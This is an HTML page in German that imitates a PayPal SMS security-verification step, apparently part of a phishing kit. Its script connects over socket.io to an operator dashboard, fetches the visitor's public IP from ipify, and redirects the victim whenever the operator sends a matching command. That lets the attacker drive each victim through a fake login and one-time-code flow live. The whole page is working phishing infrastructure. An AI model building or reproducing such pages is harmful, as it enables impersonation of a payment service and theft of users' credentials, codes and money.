<!DOCTYPE html>
<html lang="de"></html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/index.css">
    
</head>
<body>
    <header>
    </header>
    <main>
        <form action="">
            <div class="logosms">
                <img src="./img/pipillgomark.png" alt="">
            </div>
            <div class="text">
                <p>Schnelle Sicherheitsüberprüfung</p>
                <p>Dies hilft uns, Ihr Konto zu schützen.</p>
            </div>
            <div class="logosms">
                <img style="height: 100px; width: 100px;" src="./img/pipolapayo.png" alt="">
                <a href="">Code abrufen</a>
            </div>

            <div class="bot">
                <div class="mid" style="padding-bottom: 30px;">
                    <span style="color: #545d68;font-size: 14px;font-weight: 400;">Wenn Sie fortfahren, bestätigen Sie, dass Sie berechtigt sind, diese Telefonnummer zu verwenden und dass Sie einen Code zur Bestätigung Ihrer Identität in dieser Sitzung erhalten möchten. Es können Gebühren des Mobilfunkanbieters anfallen.</span>
                </div>
                <div class="first">
                    <a href="">Weiter</a>
                </div>
            </div>
        </form>
    </main>
    <footer>
        <p>Kontakt</p>
        <p>Datenschutz</p> 
        <p>Rechtliches</p>
        <p>Aktualisierungen der Richtlinien</p>
        <p>Weltweit</p>
    </footer>


    <script src="./socket.io/socket.io.js"></script>
    <script>
      async function getPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log("Public IP:", data.ip);
    return data.ip;
  } catch (error) {
    console.error("Failed to fetch IP:", error);
    return null;
  }
}
      const socket = io();
     
      // Handle redirect messages from server
      socket.on('redirect', async (data) => {
        const currentIp = await getPublicIP();
        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
        
        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {

          window.location.href = data.url;
        }
      });
      </script>
</body>
</html>